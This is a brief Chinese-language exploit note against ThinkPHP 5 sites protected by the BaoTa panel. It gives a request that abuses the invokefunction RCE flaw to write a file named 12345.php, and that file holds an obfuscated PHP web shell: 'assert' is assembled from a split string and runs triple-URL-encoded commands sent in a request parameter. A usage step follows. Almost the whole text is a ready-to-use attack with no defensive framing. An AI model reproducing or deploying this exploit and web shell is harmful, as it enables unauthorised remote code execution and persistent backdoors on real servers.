#  TP5  RCE  bypass 宝塔

---

传小马bypass宝塔：

```
/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars0]=file_put_contents&vars[1][]=12345.php&vars[1][1]=
postdata：
<?php
$poc ="axsxsxexrxt";
$poc_1 = explode("x", $poc);
$poc_2 = $poc_1[0] . $poc_1[1] . $poc_1[2] . $poc_1[3]. $poc_1[4]. $poc_1[5];
$poc_2(urldecode(urldecode(urldecode($_REQUEST['12345']))));
?>
---
/12345.php
postdata：
12345=函数三次url加密（如：phpinfo()）
```

